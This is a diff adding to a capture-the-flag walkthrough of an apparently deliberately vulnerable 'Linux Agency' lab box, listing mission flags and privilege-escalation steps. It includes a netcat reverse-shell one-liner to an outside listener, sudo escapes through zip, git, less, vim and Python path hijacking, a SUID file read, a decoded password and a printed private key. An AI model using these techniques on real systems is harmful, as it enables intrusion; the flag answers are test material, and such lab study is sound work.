@@ -632,3 +632,640 @@ mission23@linuxagency:~$ cat index.html | grep mission
 mission23@linuxagency:~$
 
 ```
+
+```
+25. What is the mission25 flag?
+Ans: mission25{61b93637881c87c71f220033b22a921b}
+```
+
+```
+mission24@linuxagency:~$ ls -la
+total 40
+drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 .
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission24 mission24    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission24 mission24 3771 Jan 12  2021 .bashrc
+-rwxr-xr-x  1 mission24 mission24 8576 Jan 12  2021 bribe
+drwxr-xr-x  3 mission24 mission24 4096 Jan 12  2021 .local
+-rw-r--r--  1 mission24 mission24  807 Jan 12  2021 .profile
+-rw-------  1 mission24 mission24 4934 Jan 12  2021 .viminfo
+mission24@linuxagency:~$ export pocket=money
+mission24@linuxagency:~$ ./bribe
+Here ya go!!!
+mission25{61b93637881c87c71f220033b22a921b}
+Don't tell police about the deal man ;)
+
+mission24@linuxagency:~$
+
+```
+
+```
+26. What is the mission26 flag?
+Ans: mission26{cb6ce977c16c57f509e9f8462a120f00}
+
+```
+
+```
+mission24@linuxagency:~$ su mission25
+Password:
+mission25@linuxagency:/home/mission24$ clear
+bash: clear: Permission denied
+mission25@linuxagency:/home/mission24$ cd ~
+mission25@linuxagency:~$ clear
+bash: clear: No such file or directory
+mission25@linuxagency:~$ ls -la
+bash: ls: No such file or directory
+mission25@linuxagency:~$ export TERM=xterm
+mission25@linuxagency:~$ ls -la
+bash: ls: No such file or directory
+mission25@linuxagency:~$ /usr/bin/ls -a
+bash: /usr/bin/ls: No such file or directory
+mission25@linuxagency:~$ which ls
+bash: which: No such file or directory
+mission25@linuxagency:~$ /usr/bin/which
+mission25@linuxagency:~$ /usr/bin/which ls
+mission25@linuxagency:~$ clear
+bash: clear: No such file or directory
+mission25@linuxagency:~$ pwd
+/home/mission25
+mission25@linuxagency:~$ export PATH=/bin
+mission25@linuxagency:~$ ls
+flag.txt
+mission25@linuxagency:~$ cat flag.txt
+mission26{cb6ce977c16c57f509e9f8462a120f00}
+mission25@linuxagency:~$
+```
+
+```
+27. What is the mission27 flag?
+Ans: mission27{444d29b932124a48e7dddc0595788f4d}
+```
+
+```
+mission25@linuxagency:~$ su mission26
+Password:
+mission26@linuxagency:/home/mission25$ cd ~
+mission26@linuxagency:~$ ls -la
+total 100
+drwxr-x---  2 mission26 mission26  4096 Jan 12  2021 .
+drwxr-xr-x 45 root      root       4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission26 mission26     9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission26 mission26  3771 Jan 12  2021 .bashrc
+-r--------  1 mission26 mission26 85980 Jan 12  2021 flag.jpg
+-rw-r--r--  1 mission26 mission26   807 Jan 12  2021 .profile
+mission26@linuxagency:~$ file flag.jpg
+flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
+mission26@linuxagency:~$
+
+```
+
+```
+27. What is the mission28 flag?
+Ans: mission28{03556f8ca983ef4dc26d2055aef9770f}
+```
+
+```
+mission27@linuxagency:~$ ls -la
+total 20
+drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 .
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 mission27 mission27  136 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
+-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
+mission27@linuxagency:~$ gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
+mission27@linuxagency:~$ ls -la
+total 20
+drwxr-x---  2 mission27 mission27 4096 Aug 31 09:24 .
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 mission27 mission27   51 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
+-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
+mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
+flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data, version 87a, 27914 x 29545
+mission27@linuxagency:~$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
+GIF87a
+mission28{03556f8ca983ef4dc26d2055aef9770f}
+mission27@linuxagency:~$
+
+```
+
+```
+29. What is the mission29 flag?
+Ans: mission29{8192b05d8b12632586e25be74da2fff1}
+```
+
+```
+agent47@linuxagency:~$ su mission28
+Password:
+
+irb(main):004:0> exec('/bin/bash')
+mission28@linuxagency:/home/agent47$ ls -la
+ls: cannot open directory '.': Permission denied
+mission28@linuxagency:/home/agent47$ cd ~
+mission28@linuxagency:~$ ls -la
+total 40
+drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 .
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission28 mission28    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission28 mission28  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 mission28 mission28 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 mission28 mission28 8980 Jan 12  2021 examples.desktop
+drwxr-xr-x  3 mission28 mission28 4096 Jan 12  2021 .local
+-rw-r--r--  1 mission28 mission28  807 Jan 12  2021 .profile
+-r--------  1 mission28 mission28   44 Jan 12  2021 txt.galf
+mission28@linuxagency:~$ file txt.galf
+txt.galf: ASCII text
+mission28@linuxagency:~$ cat txt.galf
+}1fff2ad47eb52e68523621b8d50b2918{92noissim
+mission28@linuxagency:~$ cat txt.galf | rev
+mission29{8192b05d8b12632586e25be74da2fff1}
+mission28@linuxagency:~$
+
+```
+
+```
+29. What is the mission30 flag?
+Ans: mission30{d25b4c9fac38411d2fcb4796171bda6e}
+```
+
+```
+mission28@linuxagency:~$ su mission29
+Password:
+mission29@linuxagency:/home/mission28$ cd ~
+mission29@linuxagency:~$ ls -la
+total 20
+drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 .
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
+lrwxrwxrwx  1 mission29 mission29    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 mission29 mission29 3771 Jan 12  2021 .bashrc
+drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 bludit
+-rw-r--r--  1 mission29 mission29  807 Jan 12  2021 .profile
+mission29@linuxagency:~$ cd bludit/
+mission29@linuxagency:~/bludit$ ls -la
+total 44
+drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
+drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
+drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
+drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
+drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
+drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
+drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
+-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
+-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
+-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
+-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
+mission29@linuxagency:~/bludit$ cat .htpasswd
+mission30{d25b4c9fac38411d2fcb4796171bda6e}
+mission29@linuxagency:~/bludit$
+
+```
+
+```
+31. What is viktor's Flag?
+viktor{b52c60124c0f8f85fe647021122b3d9a}
+
+```
+
+### Task 4: Privilege Escalation 
+
+Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.
+
+Good luck 47!!!!
+
+```
+1. su into viktor user using viktor's flag as password
+Ans: No Answer Needed.
+
+```
+
+```
+mission30@linuxagency:~$ ls -la
+total 36
+drwxr-x--- 3 mission30 mission30 4096 Jan 12 2021 .
+drwxr-xr-x 45 root root 4096 Jan 12 2021 ..
+lrwxrwxrwx 1 mission30 mission30 9 Jan 12 2021 .bash_history -> /dev/null
+-rw-r--r-- 1 mission30 mission30 220 Jan 12 2021 .bash_logout
+-rw-r--r-- 1 mission30 mission30 3771 Jan 12 2021 .bashrc
+drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 Escalator
+-rw-r--r-- 1 mission30 mission30 8980 Jan 12 2021 examples.desktop
+-rw-r--r-- 1 mission30 mission30 807 Jan 12 2021 .profile
+mission30@linuxagency:~$ cd Escalator/
+mission30@linuxagency:~/Escalator$ ls -la
+total 16
+drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 .
+drwxr-x--- 3 mission30 mission30 4096 Jan 12 2021 ..
+drwxr-xr-x 8 mission30 mission30 4096 Jan 12 2021 .git
+-rw-r--r-- 1 mission30 mission30 35 Jan 12 2021 sources.py
+mission30@linuxagency:~/Escalator$ cat sources.py
+print("Hey I have learn't python")
+mission30@linuxagency:~/Escalator$ cd .git/
+mission30@linuxagency:~/Escalator/.git$ ls -la
+total 52
+drwxr-xr-x 8 mission30 mission30 4096 Jan 12 2021 .
+drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 ..
+drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 branches
+-rw-r--r-- 1 mission30 mission30 21 Jan 12 2021 COMMIT_EDITMSG
+-rw-r--r-- 1 mission30 mission30 261 Jan 12 2021 config
+-rw-r--r-- 1 mission30 mission30 73 Jan 12 2021 description
+-rw-r--r-- 1 mission30 mission30 23 Jan 12 2021 HEAD
+drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 hooks
+-rw-r--r-- 1 mission30 mission30 145 Jan 12 2021 index
+drwxr-xr-x 2 mission30 mission30 4096 Jan 12 2021 info
+drwxr-xr-x 3 mission30 mission30 4096 Jan 12 2021 logs
+drwxr-xr-x 10 mission30 mission30 4096 Jan 12 2021 objects
+drwxr-xr-x 5 mission30 mission30 4096 Jan 12 2021 refs
+mission30@linuxagency:~/Escalator/.git$ git log
+commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
+Author: root <root@Xyan1d3>
+Date: Mon Jan 11 15:37:56 2021 +0530
+
+    My 1st python Script
+
+commit e0b807dbeb5aba190d6307f072abb60b34425d44
+Author: root <root@Xyan1d3>
+Date: Mon Jan 11 15:36:40 2021 +0530
+
+    Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
+
+mission30@linuxagency:~/Escalator/.git$
+
+```
+
+```
+2. What is dalia's flag?
+Ans: dalia{4a94a7a7bb4a819a63a33979926c77dc}
+
+```
+
+```
+viktor@linuxagency:/opt/scripts$ nano 47.sh
+viktor@linuxagency:/opt/scripts$ cat 47.sh
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+viktor@linuxagency:/opt/scripts$ nano 47.sh
+viktor@linuxagency:/opt/scripts$
+viktor@linuxagency:/opt/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.110 4242 >/tmp/f" > 47.sh
+
+C:\Users\sam>ncat -lvnp 4242
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4242
+Ncat: Listening on 0.0.0.0:4242
+Ncat: Connection from 10.10.195.97.
+Ncat: Connection from 10.10.195.97:50292.
+c/bin/sh: 0: can't access tty; job control turned off
+$ ls
+/bin/sh: 1: cls: not found
+$ ls
+examples.desktop
+flag.txt
+$ cat flag.txt
+dalia{4a94a7a7bb4a819a63a33979926c77dc}
+$
+```
+
+```
+3. What is silvio's flag?
+Ans: silvio{657b4d058c03ab9988875bc937f9c2ef}
+
+```
+
+```
+dalia@linuxagency:~$ TF=$(mktemp -u)
+TF=$(mktemp -u)
+dalia@linuxagency:~$ sudo -u silvio tc/hosts -T -TT 'sh #'
+sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 37%)
+$ id
+id
+uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+silvio@linuxagency:/home/dalia$ cd ~
+cd ~
+silvio@linuxagency:~$ ls -la
+ls -la
+total 40
+drwxr-x---  3 silvio silvio 4096 Jan 12  2021 .
+drwxr-xr-x 45 root   root   4096 Jan 12  2021 ..
+lrwxrwxrwx  1 silvio silvio    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 silvio silvio  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 silvio silvio 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 silvio silvio 8980 Jan 12  2021 examples.desktop
+-rw-r--r--  1 silvio silvio   41 Jan 12  2021 flag.txt
+drwxr-xr-x  3 silvio silvio 4096 Jan 12  2021 .local
+-rw-r--r--  1 silvio silvio  807 Jan 12  2021 .profile
+silvio@linuxagency:~$ cat flag.txt
+cat fla.txt
+cat: fla.txt: No such file or directory
+silvio@linuxagency:~$ cat flag.txt
+cat flag.txt
+silvio{657b4d058c03ab9988875bc937f9c2ef}
+silvio@linuxagency:~$
+
+```
+
+```
+4. What is reza's flag?
+Ans: reza{2f1901644eda75306f3142d837b80d3e}
+
+```
+
+```
+silvio@linuxagency:~$
+silvio@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for silvio on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User silvio may run the following commands on linuxagency:
+    (reza) SETENV: NOPASSWD: /usr/bin/git
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password:
+Sorry, try again.
+Password:
+
+
+Sorry, try again.
+Password:
+sudo: 3 incorrect password attempts
+silvio@linuxagency:~$
+
+silvio@linuxagency:~$ sudo -u reza h -c "exec sh 0<&1"' git -p help
+sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+$ ls -la
+ls -la
+ls: cannot open directory '.': Permission denied
+$ id
+id
+uid=1033(reza) gid=1033(reza) groups=1033(reza)
+$ which python
+which python
+/usr/bin/python
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+reza@linuxagency:/home/silvio$ ls -la
+ls -la
+ls: cannot open directory '.': Permission denied
+reza@linuxagency:/home/silvio$ cd ~
+cd ~
+reza@linuxagency:~$ ls -la
+ls -la
+total 40
+drwxr-x---  3 reza reza 4096 Jan 12  2021 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 reza reza    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 reza reza  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 reza reza 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 reza reza 8980 Jan 12  2021 examples.desktop
+-r--------  1 reza reza   39 Jan 12  2021 flag.txt
+drwxr-xr-x  3 reza reza 4096 Jan 12  2021 .local
+-rw-r--r--  1 reza reza  807 Jan 12  2021 .profile
+reza@linuxagency:~$ cat flag.txt
+cat flag.txt
+reza{2f1901644eda75306f3142d837b80d3e}
+reza@linuxagency:~$
+
+```
+
+```
+5. What is jordan's flag?
+Ans: jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
+
+```
+
+```
+reza@linuxagency:/home/reza$ sudo -l
+Matching Defaults entries for reza on localhost:
+env_reset, env_file=/etc/sudoenv, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser reza may run the following commands on localhost:
+(jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+
+reza@linuxagency:/home/reza$ echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop.py
+reza@linuxagency:/home/reza$ sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
+
+jordan@linuxagency:~$ cat flag.txt | rev
+jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
+jordan@linuxagency:~$
+
+```
+
+```
+6. What is ken's flag?
+Ans: ken{4115bf456d1aaf012ed4550c418ba99f}
+
+```
+
+```
+jordan@linuxagency:/home/dalia$ sudo -l
+sudo -l
+Matching Defaults entries for jordan on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jordan may run the following commands on linuxagency:
+    (ken) NOPASSWD: /usr/bin/less
+jordan@linuxagency:/home/dalia$
+
+jordan@linuxagency:~$ sudo -u ken less /etc/profile
+sudo -u ken less /etc/profile
+$ whoami
+whoami
+ken
+
+ken@linuxagency:~$ ls -la
+ls -la
+total 36
+drwxr-x---  2 ken  ken  4096 Jan 12  2021 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 ken  ken     9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 ken  ken   220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 ken  ken  3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 ken  ken  8980 Jan 12  2021 examples.desktop
+-r--------  1 ken  ken    38 Jan 12  2021 flag.txt
+-rw-r--r--  1 ken  ken   807 Jan 12  2021 .profile
+ken@linuxagency:~$ cat flag.txt
+cat flag.txt
+ken{4115bf456d1aaf012ed4550c418ba99f}
+ken@linuxagency:~$
+
+```
+
+```
+7. What is sean's flag?
+Ans: sean{4c5685f4db7966a43cf8e95859801281}
+
+```
+
+```
+ken@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for ken on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ken may run the following commands on linuxagency:
+    (sean) NOPASSWD: /usr/bin/vim
+ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/sh'
+
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+
+sean@linuxagency:~$ grep -rn "sean{" /var/log
+grep -rn "sean{" /var/log
+grep: /var/log/btmp: Permission denied
+grep: /var/log/btmp.1: Permission denied
+grep: /var/log/speech-dispatcher: Permission denied
+/var/log/syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
+grep: /var/log/tallylog: Permission denied
+grep: /var/log/installer/partman: Permission denied
+grep: /var/log/installer/casper.log: Permission denied
+grep: /var/log/installer/debug: Permission denied
+grep: /var/log/installer/version: Permission denied
+grep: /var/log/installer/syslog: Permission denied
+sean@linuxagency:~$
+
+$ echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
+The password of penelope is p3nelope
+
+```
+
+```
+8. What is penelope's flag?
+Ans: penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+
+```
+
+```
+$ ssh penelope@10.10.60.72
+penelope@10.10.60.72's password:
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+penelope@linuxagency:~$
+
+penelope@linuxagency:~$ ls -la
+total 84
+drwxr-x---  4 penelope penelope  4096 Sep  3 23:40 .
+drwxr-xr-x 45 root     root      4096 Jan 12  2021 ..
+-rwsr-sr-x  1 maya     maya     39096 Jan 12  2021 base64
+lrwxrwxrwx  1 penelope penelope     9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 penelope penelope   220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 penelope penelope  3771 Jan 12  2021 .bashrc
+drwx------  2 penelope penelope  4096 Sep  3 23:40 .cache
+-rw-r--r--  1 penelope penelope  8980 Jan 12  2021 examples.desktop
+-r--------  1 penelope penelope    43 Jan 12  2021 flag.txt
+drwx------  3 penelope penelope  4096 Jan 12  2021 .gnupg
+-rw-r--r--  1 penelope penelope   807 Jan 12  2021 .profile
+penelope@linuxagency:~$ cat flag.txt
+penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+penelope@linuxagency:~$
+
+```
+
+```
+8. What is maya's flag
+Ans: maya{a66e159374b98f64f89f7c8d458ebb2b}
+
+```
+
+```
+penelope@linuxagency:~$ LFILE=/home/maya/flag.txt
+penelope@linuxagency:~$ /home/penelope/base64 "$LFILE" | base64 -d
+maya{a66e159374b98f64f89f7c8d458ebb2b}
+penelope@linuxagency:~$
+
+```
+
+```
+maya@linuxagency:~$ ls -la
+total 52
+drwxr-x---  5 maya maya 4096 Jan 15  2021 .
+drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
+lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
+-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
+-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
+-r--------  1 maya maya   39 Jan 12  2021 flag.txt
+drwxr-xr-x  3 maya maya 4096 Jan 12  2021 .local
+drwxr-xr-x  2 maya maya 4096 Jan 15  2021 old_robert_ssh
+-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
+drwx------  2 maya maya 4096 Jan 12  2021 .ssh
+maya@linuxagency:~$ cd old_robert_ssh/
+maya@linuxagency:~/old_robert_ssh$ ls -la
+total 16
+drwxr-xr-x 2 maya maya 4096 Jan 15  2021 .
+drwxr-x--- 5 maya maya 4096 Jan 15  2021 ..
+-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
+-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
+maya@linuxagency:~/old_robert_ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B
+
+iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
+i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
+RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
+PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
+7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
+QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
+nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
+OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
++HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
+JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
+dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
+jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
+KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
+EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
+4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
+V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
+uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
+n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
+fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
+rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
+zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
+yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
+APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
+K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
+Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
+-----END RSA PRIVATE KEY-----
+maya@linuxagency:~/old_robert_ssh$
+
+maya@linuxagency:~/old_robert_ssh$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG993ZxnyDUpDtF/8R0oZv5XWMY0heGLopfBteg79pQb3sIOjeuy8+Cx+P2i7PybERDVVq3c5tw+wpqHjQCKhH+wFgo8ApUlzIeiJ0AdExtLh0+BY/4xf5A4qdc1xT5Jl592BX/vH4epHji9YSLB8bzOlx5stAyqhgosuDCehdgrwZE2fX37DuLtSvR4Jw53Yq8XO3XE9fwYFytvaGbr48lI727vJ4kcUGEe5tjveHNQLoMhJEabcNIdmoH9uFm0aDj/tbWzyjFGS38s/5TCod7SHMRYXSbzy2BcNwLerPfsTQgIza92om2HyovHWx4olt9doZbJ8Fg2LLmgXlz5Cv robert@0fd0d503162d
+maya@linuxagency:~/old_robert_ssh$
+
+
+```
+
